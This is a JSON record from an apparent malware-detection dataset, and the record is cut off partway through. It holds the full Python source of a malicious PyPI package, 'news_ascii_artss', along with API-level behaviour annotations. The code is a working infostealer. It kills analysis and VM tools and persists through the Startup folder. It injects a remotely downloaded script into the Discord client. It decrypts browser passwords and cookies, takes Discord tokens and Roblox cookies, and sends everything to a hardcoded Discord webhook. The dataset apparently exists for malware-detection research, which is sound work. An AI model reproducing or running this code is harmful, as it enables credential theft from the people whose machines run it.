{
  "metadata": {
    "package_name": "news_ascii_artss-0.1",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/news_ascii_artss-0.1.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/news_ascii_artss-0.1.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "news_ascii_folder.py",
      "code_snippets": [
        {
          "snippet": "import requests, os,ntpath,re, sqlite3,json,sys,win32crypt,psutil,shutil,ctypes\nfrom shutil import copy2\nfrom base64 import b64decode\nfrom win32crypt import CryptUnprotectData\nfrom subprocess import PIPE, Popen\nfrom tempfile import mkdtemp, gettempdir\nfrom Crypto.Cipher import AES\n\nnom_utilisateur = os.getlogin()\nnom_pc = os.getenv(\"COMPUTERNAME\")\n\ndef killprocess():\n  blackListedPrograms = [\"httpdebuggerui\", \"wireshark\", \"fiddler\", \"regedit\", \"cmd\", \"taskmgr\",\"vboxservice\", \"df5serv\", \"processhacker\", \"vboxtray\", \"vmtoolsd\", \"vmwaretray\",\"ida64\", \"ollydbg\", \"pestudio\", \"vmwareuser\", \"vgauthservice\", \"vmacthlp\",\"x96dbg\", \"vmsrvc\", \"x32dbg\", \"vmusrvc\", \"prl_cc\", \"prl_tools\", \"xenservice\",\"qemu-ga\", \"joeboxcontrol\", \"ksdumperclient\", \"ksdumper\", \"joeboxserver\"]\n  for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:\n    blackListedPrograms.append(i)\n  for proc in psutil.process_iter():\n    if any(procstr in proc.name().lower() for procstr in blackListedPrograms):\n      try:\n        proc.kill()\n      except (psutil.NoSuchProcess, psutil.AccessDenied):\n        pass\n      \n  \ndef startup():\n  try:\n    roaming = os.getenv(\"appdata\")\n    startup_loc = ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    scopy = shutil.copy2(sys.argv[0], startup_loc)\n    ctypes.windll.kernel32.SetFileAttributesW(scopy, 2)\n  except:pass\n\ndef injectionnn():\n  global notrewebhook\n  icon = \"https://ae01.alicdn.com/kf/HTB1sAIaoMKTBuNkSne1q6yJoXXaS/Astro-Boy-Mascot-Costume-Fancy-Dress-Party-Costume-Adult-Size-Cartoon-Character-Cute-Mascot-Halloween-Party.jpg_640x640.jpg\"\n  color = \"1184274\"\n  messagefooter = \"Astro GuyEdit :smile_cat:\"\n  hook_reg = \"api/webhooks\"\n  injection_url = \"https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/Injection-clean.js\"\n  webhook = notrewebhook\n  appdata = os.getenv(\"localappdata\")\n  startup_loc = ntpath.join(os.getenv(\"appdata\"), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n  for _dir in os.listdir(appdata):\n    if 'discord' in _dir.lower():\n      discord = appdata + os.sep + _dir\n      for __dir in os.listdir(ntpath.abspath(discord)):\n        if re.match(r'app-(\\d*\\.\\d*)*', __dir):\n          app = ntpath.abspath(ntpath.join(discord, __dir))\n          modules = ntpath.join(app, 'modules')\n          if not ntpath.exists(modules):\n            return\n          for ___dir in os.listdir(modules):\n            if re.match(r\"discord_desktop_core-\\d+\", ___dir):\n              inj_path = modules + os.sep + ___dir + f'\\\\discord_desktop_core\\\\'\n              if ntpath.exists(inj_path):\n                if startup_loc not in sys.argv[0]:\n                    try:\n                      os.makedirs(inj_path + 'initiation', exist_ok=True)\n                    except PermissionError:\n                      pass\n                if hook_reg in webhook:\n                  f = requests.get(injection_url).text.replace(\"%WEBHOOK%\", webhook).replace(\"auto_buy_nitro: true\", \"auto_buy_nitro: false\").replace(\"Discord Injection By github.com/Rdimoãƒ»https://github.com/Rdimo/Discord-Injection\", messagefooter).replace(\"https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png\", icon).replace(\"8363488\", color)\n                else:\n                  return\n                try:\n                  with open(inj_path + 'index.js', 'w', errors=\"ignore\") as indexFile:\n                    indexFile.write(f)\n                except PermissionError:\n                  pass\n                os.startfile(app + sep + _dir + '.exe')\n\ndef injector():\n  killprocess()\n  startup()\n  injectionnn()\n\n\ndef initialize():\n  global notrewebhook\n  notrewebhook = \"https://canary.discord.com/api/webhooks/1077196044984664076/X9UIvKNnT_LKe3WpZD6p76HbVhDH6GfZMgj35P0EUZquSAgiWCRePLblKCMO5QTNt8q2\"\n  password_nav()\n  try:\n    injector()\n  except:\n    pass\n  try:\n    pc_info()\n  except:\n    pass\n  try:\n    password_nav()\n  except:\n    pass\n  try:\n    minecraft()\n  except:\n    pass\n  try:\n    cookie_stl()\n  except:\n    pass\n  try:\n    tken()\n  except:\n    pass\n  try:\n    os.remove(f\"./cookie_{nom_utilisateur}.txt\")\n  except:\n    pass\n  try:\n    os.remove(f\"./pswd_{nom_utilisateur}.txt\")\n  except:\n    pass\n\n\ndef pc_info():\n  global notrewebhook\n  p = Popen(\"wmic csproduct get uuid\", shell=True,\n                  stdin=PIPE, stdout=PIPE, stderr=PIPE)\n  hwid = (p.stdout.read() + p.stderr.read()).decode().split(\"\\n\")[1]\n  info = f\"IP Publiiccc(acking): {requests.get('http://ipinfo.io/json').json()['ip']}\\nPC name: {os.getenv('COMPUTERNAME')}\\nUsername: {os.getenv('UserName')}\\nHWID: {hwid}\"\n  embed = {\n      \"description\": f\"Information PC:```{info}```\",\n      \"title\": f\":white_check_mark: - `New Client: *{nom_utilisateur}*`\"\n  }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]})\n\n\ndef laclestpbg_chrome(path) -> str:\n        if not ntpath.exists(path):\n            return None\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        try:\n            master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            nice_value = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]\n            return nice_value\n        except KeyError:\n            return None\n\ndef decrypt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception as e:\n            return f'Failed to decrypt \"{str(buff)}\" | key: \"{str(master_key)}\\nException: {e}\"'\n\ndef cookie_stl():\n  global list_cookie, robloxcookies, notrewebhook\n  list_cookie = []\n  robloxcookies = []\n  cookie_firefox()\n  grabCookies()\n  list_cookie.extend(robloxcookies)\n  lc = \"\".join(list_cookie)\n  robloxcookies = \"\\n\".join(robloxcookies)\n  if len(robloxcookies) < 4:\n    robloxembed = {\n      \"description\": f\"```no roblox avaible``` :(\",\n      \"title\": f\":red_car:  - `roblox from *{nom_utilisateur}*`\"\n    }\n  else:\n    robloxembed = {\n      \"description\": f\"roblox:\\n {robloxcookies}```\",\n      \"title\": f\":red_car:  - `roblox from *{nom_utilisateur}*`\"\n    }\n  result = requests.post(notrewebhook, json={\"embeds\": [robloxembed]} )\n  embed = {\n      \"description\": f\"cooooki3 steeeelllzaaadd:\\n {lc}```\",\n      \"title\": f\":cook: - `ckie from *{nom_utilisateur}*`\"\n  }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]} )\n  if str(result.status_code) != \"204\":\n    f = open(f\"cookie_{nom_utilisateur}.txt\", \"w+\")\n    f.write(lc)\n    f.close()\n    nembed = {\n      \"description\": f\"cooooki3 steeeelllzaaadd:\\n (file with)```\",\n      \"title\": f\":cook: - `ckie from *{nom_utilisateur}*`\"\n    }\n    files = {\n      'file': (f'./cookie_{nom_utilisateur}.txt', open(f'./cookie_{nom_utilisateur}.txt', 'rb')),\n    }\n    r = requests.post(notrewebhook, json={\"embeds\": [nembed]}, files=files)\n  else:\n    pass\n\n\ndef password_nav():\n  global list_pass, notrewebhook\n  list_pass = []\n  pswd_chrome()\n  pswd_other()\n  lp = \"\\n\".join(list_pass)\n  embed = {\n      \"description\": f\"pswwrd steeeelllzaaadd:\\n{lp}```\",\n      \"title\": f\":flushed: - `psxd of *{nom_utilisateur}*`\"\n  }\n  result = requests.post(notrewebhook, json={\"embeds\": [embed]})\n  if str(result.status_code) != \"204\":\n    f = open(f\"pswd_{nom_utilisateur}.txt\", \"w+\")\n    f.write(lp)\n    f.close()\n    nembed = {\n      \"description\": f\"pwdddddd steeeelllzaaadd:\\n (file with)```\",\n      \"title\": f\":flushed: - `pwd from *{nom_utilisateur}*`\"\n    }\n    files = {\n      'file': (f'./pswd_{nom_utilisateur}.txt', open(f'./pwd_{nom_utilisateur}.txt', 'rb')),\n    }\n    r = requests.post(notrewebhook, json={\"embeds\": [nembed]}, files=files)\n\ndef pswd_other():\n  global list_pass\n  local = os.getenv('LOCALAPPDATA')\n  roaming = os.getenv('APPDATA')\n  browser_loc = {\n      \"Brave\": f\"{local}\\\\BraveSoftware\\\\Brave-Browser\",\n      \"Edge\": f\"{local}\\\\Microsoft\\\\Edge\",\n      \"Opera\": f\"{roaming}\\\\Opera Software\\\\Opera Stable\",\n      \"OperaGX\": f\"{roaming}\\\\Opera Software\\\\Opera GX Stable\",\n  }\n  for name, path in browser_loc.items():\n        decrypt_files(path, name)\n        \n\ndef pswd_chrome():\n  global list_pass\n  try:\n    list_pass.append(\"**    - CHROME:**```\")\n    appdata = os.getenv(\"localappdata\")\n    chrome = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')\n    chrome_regex = re.compile(r'^(profile\\s\\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)\n    chrome_key = laclestpbg_chrome(ntpath.join(chrome, \"Local State\"))\n    for prof in os.listdir(chrome):\n      if re.match(chrome_regex, prof):\n          login_db = ntpath.join(chrome, prof, 'Login Data')\n          conn = sqlite3.connect(login_db)\n          cursor = conn.cursor()\n          cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n          for r in cursor.fetchall():\n              url = r[0]\n              username = r[1]\n              encrypted_password = r[2]\n              decrypted_password = decrypt_val(encrypted_password, chrome_key)\n              if url != \"\":\n                  list_pass.append(f\"Domain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\\n==========================\")\n          cursor.close()\n          conn.close()\n  except Exception as e:\n    pass\n\ndef cookie_firefox():\n  global list_cookie\n  if sys.platform == \"win32\" or sys.platform == \"cygwin\":\n      path = os.path.join(os.path.expanduser(\"~\"), \"AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\")\n  elif sys.platform == \"darwin\":\n      path = os.path.join(os.path.expanduser(\"~\"), \"Library/Application Support/Firefox/Profiles\")\n  else:\n      path = os.path.join(os.path.expanduser(\"~\"), \".mozilla/firefox\")\n  subfolders = os.listdir(path)\n  for subfolder in subfolders:\n      cookies_file = os.path.join(os.path.join(path, subfolder), \"cookies.sqlite\")\n      if os.path.isfile(cookies_file):\n          break\n  conn = sqlite3.connect(cookies_file)\n  c = conn.cursor()\n  c.execute(\"SELECT * FROM moz_cookies\")\n  for result in c.fetchall():\n      host = result[4]\n      user = result[2]\n      if host != \"\":\n        list_cookie.append(f\"HOST KEY: {host} | NAME: {user} | VALUE: {result[3]}\\n\")\n  conn.close()\n\ndef grabCookies():\n        global robloxcookies, list_cookie\n        appdata = os.getenv('LOCALAPPDATA')\n        chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')\n        chrome_reg = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)\n        chrome_key = laclestpbg_chrome(ntpath.join(chrome_user_data, \"Local State\"))\n        dire = mkdtemp(), gettempdir()\n        for prof in os.listdir(chrome_user_data):\n            if re.match(chrome_reg, prof):\n                login_db = ntpath.join(chrome_user_data, prof, 'Network', 'cookies')\n                conn = sqlite3.connect(login_db)\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT host_key, name, encrypted_value from cookies\")\n                for r in cursor.fetchall():\n                    host = r[0]\n                    user = r[1]\n                    decrypted_cookie = decrypt_val(r[2], chrome_key)\n                    if host != \"\":\n                        list_cookie.append(f\"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\\n\")\n                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:\n                        robloxcookies.append(decrypted_cookie)\n                cursor.close()\n                conn.close()\n\ndef tken():\n    list_tken = []\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    paths = {\n        'Discord': roaming + '\\\\Discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n    }\n    message = \"\"\n    for platform, path in paths.items():\n          if not os.path.exists(path):\n            continue\n          tokens = find_tokens(path)\n          if len(tokens) > 0:\n            for token in tokens:\n                message = message + f\"{platform}: ```{token}```\\n\" \n          else:\n            message = message + f'No tkens found on {platform}.\\n' \n    embed = {\n          \"description\": message,\n          \"title\": f\":coin:` - tkn of  *{nom_utilisateur}*`\",\n    }\n    result = requests.post(notrewebhook, json={\"embeds\": [embed]}) \n",
          "triple_sequences": [
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "COMPUTERNAME",
              "object_description": "Environment variable for Windows hostname",
              "object_id": "windows_hostname_env_var",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "",
              "object_description": "Process name",
              "object_id": "",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "proc.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "appdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "sys.argv[0], startup_loc",
              "object_description": "Executable file and startup path",
              "object_id": "executable_startup_path",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "ctypes.windll.kernel32.SetFileAttributesW()",
              "action_description": "Sets file attributes for specified file",
              "action_id": "set_file_attributes",
              "object": "scopy, 2",
              "object_description": "File permission settings",
              "object_id": "file_permission",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "localappdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "appdata",
              "object_description": "User directory",
              "object_id": "user_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "ntpath.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "discord",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "ntpath.abspath(discord)",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "re.match()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'app-(\\d*\\.\\d*)*', __dir",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Browser profile detection preparation",
              "intention_id": "browser_profile_detection_preparation"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "discord, __dir",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "app, 'modules'",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "ntpath.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "modules",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "modules",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "re.match()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r\"discord_desktop_core-\\d+\", ___dir",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Browser profile detection preparation",
              "intention_id": "browser_profile_detection_preparation"
            },
            {
              "action_api": "ntpath.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "inj_path",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "inj_path + 'initiation', exist_ok=True",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "injection_url",
              "object_description": "URL string",
              "object_id": "url_string",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "inj_path + 'index.js', 'w', errors=\"ignore\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "indexFile.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.startfile()",
              "action_description": "Opens file with associated application",
              "action_id": "open_file_app",
              "object": "app + sep + _dir + '.exe'",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "\"wmic csproduct get uuid\", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Create child process",
              "intention_id": "create_child_process"
            },
            {
              "action_api": "p.stdout.read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "Command output",
              "object_id": "command_output",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "p.stderr.read()",
              "action_description": "Reads all bytes from process standard error",
              "action_id": "read_process_stderr",
              "object": "",
              "object_description": "Command output",
              "object_id": "command_output",
              "intention_description": "Access command error output",
              "intention_id": "access_command_error_output"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "'http://ipinfo.io/json'",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "notrewebhook, json={\"embeds\": [embed]}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send system information to server",
              "intention_id": "send_system_info_server"
            },
            {
              "action_api": "ntpath.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, \"r\", encoding=\"utf-8\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "c",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:], None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "LOCALAPPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "cookies_file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "cookies_file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "c.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT * FROM moz_cookies\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies data",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "c.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "LOCALAPPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "appdata, 'Google', 'Chrome', 'User Data'",
              "object_description": "Chrome user data directory path",
              "object_id": "chrome_user_data_directory",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "re.compile()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE",
              "object_description": "Regular expression pattern",
              "object_id": "regex_pattern",
              "intention_description": "Browser profile detection preparation",
              "intention_id": "browser_profile_detection_preparation"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "chrome_user_data, \"Local State\"",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "mkdtemp()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Create temporary directory",
              "intention_id": "create_temporary_directory"
            },
            {
              "action_api": "gettempdir()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Collect temporary directory path",
              "intention_id": "collect_temp_directory_path"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "chrome_user_data",
              "object_description": "Chrome user data directory path",
              "object_id": "chrome_user_data_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "re.match()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "chrome_reg, prof",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Browser profile detection preparation",
              "intention_id": "browser_profile_detection_preparation"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "chrome_user_data, prof, 'Network', 'cookies'",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "login_db",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT host_key, name, encrypted_value from cookies\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies data",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
